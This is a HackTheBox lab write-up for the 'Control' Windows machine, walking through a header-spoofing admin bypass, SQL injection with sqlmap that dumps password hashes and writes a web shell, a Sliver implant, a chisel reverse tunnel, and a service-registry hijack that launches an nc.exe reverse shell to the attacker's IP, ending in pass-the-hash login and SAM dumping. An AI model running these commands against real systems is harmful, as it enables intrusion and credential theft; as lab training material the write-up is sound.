---
title: Control [Hard]
date: 2025-09-06
categories: [HackTheBox, OSEP]
tags: AD Web Windows
img_path: /assets/Images/HTB_Control/logo.png
image:
  path: /assets/Images/HTB_Control/logo.png
---

# Control [Hard] OSEP

![Screenshot 2025-09-07 at 2.50.50 PM.png](/assets/Images/HTB_Control/Screenshot_2025-09-07_at_2.50.50_PM.png)

## 🤨 Enumeration

```bash
nmap_default 10.129.133.21 -p-
```

```bash
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Fidelity
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql   MariaDB 10.3.24 or later (unauthorized)
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

```bash
http://control.htb
```

![image.png](/assets/Images/HTB_Control/image.png)

Using Fuff or gobuster to get this directory

```bash
http://control.htb/admin.php
```

![image.png](/assets/Images/HTB_Control/image%201.png)

There is a comment in the source code of the home page 

![aaaaasasa.png](/assets/Images/HTB_Control/aaaaasasa.png)

Access Denied because it shows that there is a Header missing 

![image.png](/assets/Images/HTB_Control/image%202.png)

### Admin Panel Auth Bypass

For Adding Proxy in the request we can use <mark>X-Forwarded-For</mark> and add the IP so it can be accessible

[X-Forwarded-For header - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Forwarded-For)

We used `X-Forwarded-For` bypassing the Restriction.  

```bash
GET /admin.php HTTP/1.1
Host: control.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://control.htb/
Connection: keep-alive
X-Forwarded-For: 192.168.4.28
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Boom !! It Worked!.

![image.png](/assets/Images/HTB_Control/image%203.png)

There is a Find Products So the most command thing is to check for SQLi

from the nmap out we already know there is a `mysql` instances is already running

![image.png](/assets/Images/HTB_Control/image%204.png)

Adding Header for ever request we made this will allow us to access the page smoothly 

![image.png](/assets/Images/HTB_Control/image%205.png)

Using a Words which does’nt exsist to check the response

![image.png](/assets/Images/HTB_Control/image%206.png)

### SQLi With File Write permission

Adding a single quote `‘` to check for SQLi 

We see a SQL Syntax is reflected on the page

```bash
link'
```

![image.png](/assets/Images/HTB_Control/image%207.png)

Using a simple mysql comment to check can we end the query here 

It worked

```bash
link'-- -
```

![image.png](/assets/Images/HTB_Control/image%208.png)

To check the Number of column are used in the statement for union injection

```bash
link'order by 0-- -
```

![image.png](/assets/Images/HTB_Control/image%209.png)

That means there are only 6 column used in the statement

```bash
link'order by 7-- -
```

![image.png](/assets/Images/HTB_Control/image%2010.png)

Using Sqlmap to enumerate database

```bash
sqlmap -r products.req --risk 3 --level 4 --batch
```

![image.png](/assets/Images/HTB_Control/image%2011.png)

Product Table

![image.png](/assets/Images/HTB_Control/image%2012.png)

product_category table

![image.png](/assets/Images/HTB_Control/image%2013.png)

Dumping the users and there password hashes

```bash
sqlmap -r products.req --risk 3 --level 4 --batch --dump --passwords
```

![image.png](/assets/Images/HTB_Control/image%2014.png)

Cracked it via using CrackStation

```bash
l33th4x0rhector
l3tm3!n
```

![image.png](/assets/Images/HTB_Control/image%2015.png)

Using sqlmap to write a file on the server because we know this is a windows machine so the command path to upload the file is under `wwwroot`

```bash
sqlmap -r products.req --risk 3 --level 4 --batch --file-write pain.php --file-dest 'C:\inetpub\wwwroot\pain.php'
```

![image.png](/assets/Images/HTB_Control/image%2016.png)

## 🔱 Initial Access

Got RCE 

![image.png](/assets/Images/HTB_Control/image%2017.png)

i just uploaded my sliver implant on the machine and ran

![image.png](/assets/Images/HTB_Control/image%2018.png)

Got a Sliver Session

![image.png](/assets/Images/HTB_Control/image%2019.png)

Using Chisel for socks connection because we see there are not much port we can connect from outside of the box
Chisel BOF command for sliver

```bash
chisel client 10.10.14.216:5555 R:1081:socks
```

```bash
./chisel_1.10.1_linux_arm64 server --port 5555 --reverse --socks5
```

![image.png](/assets/Images/HTB_Control/image%2020.png)

Using evil-winrm to connect to the machine and reading the user.txt

![image.png](/assets/Images/HTB_Control/image%2021.png)

## 💀 Priv Esc

### Service Abuse / Service Hijacking

After running `winPEASx64.exe` we got Powershell History File

```bash
PS history file: C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![image.png](/assets/Images/HTB_Control/image%2022.png)

In this there is a Hint that the user was looking for this Register Keys

```bash
PS C:\Users\Hector\Documents> cat C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list

```

That command lists all registry keys and values under `HKLM:\SYSTEM\CurrentControlSet` and displays their details in a formatted list.

```bash
PS C:\Users\Hector\Documents> get-childitem HKLM:\SYSTEM\CurrentControlset | format-list

Property      : {BootDriverFlags, CurrentUser, EarlyStartServices, PreshutdownOrder...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Co
                ntrol
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Control
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 121
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 11
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control

Property      : {NextParentID.daba3ff.2, NextParentID.61aaa01.3, NextParentID.1bd7f811.4,
                NextParentID.2032e665.5...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\En
                um
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Enum
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 17
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 27
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Ha
                rdware Profiles
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Hardware Profiles
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 3
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Po
                licies
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Policies
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 0
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Se
                rvices
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Services
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 667
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\So
                ftware
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Software
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 1
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
```

We started by checking registry permissions under `HKLM:\SYSTEM\CurrentControlSet\Services`. From the ACL output, we saw that the user **Hector** had **FullControl** over this key. This meant we could modify service configurations in the registry.

```bash
PS C:\Users\Hector\Documents> get-acl HKLM:\SYSTEM\CurrentControlset\Services | format-list
get-acl HKLM:\SYSTEM\CurrentControlset\Services | format-list

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : CREATOR OWNER Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         **CONTROL\Hector Allow  FullControl**
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
Audit  : 
Sddl   : O:SYG:SYD:PAI(A;CIIO;KA;;;CO)(A;CI;KR;;;AU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KA;;;S-1-5-2
         1-3271572904-80546332-2170161114-1000)(A;CI;KR;;;AC)

```

![image.png](/assets/Images/HTB_Control/image%2023.png)

```bash
Get-ItemProperty HKLM:\SYSTEM\CurrentControlset\Services\wuauserv
```

![image.png](/assets/Images/HTB_Control/image%2024.png)

Next, we looked for a suitable service to abuse and chose **`wuauserv` (Windows Update Service)** because:

- It runs with **SYSTEM privileges**.
- It is a **commonly present service** on Windows, so it’s reliable.
- It can be started manually without crashing the system.

We replaced its **`ImagePath`** in the registry with our payload:

```bash
reg add "HKLM\SYSTEM\CurrentControlset\Services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\Tools\nc.exe 10.10.14.216 2004 -e cmd" /f

The operation completed successfully.
```

This told Windows to execute our reverse shell instead of the normal service binary. Finally, we started the service:

```bash
Start-Service wuauserv
```

Got a Reverse Shell as `SYSTEM`

![image.png](/assets/Images/HTB_Control/image%2025.png)

For Persistences also got a Sliver session

![image.png](/assets/Images/HTB_Control/image%2026.png)

Login as Administrator in the machine

```bash
proxychains evil-winrm -i 127.0.0.1 -u 'Administrator' -H 'c2b0900f281741100a59fd04e3d72ef0'
```

![image.png](/assets/Images/HTB_Control/image%2027.png)

Dumping the `sam` file

![image.png](/assets/Images/HTB_Control/image%2028.png)

---

### `Author : PaiN`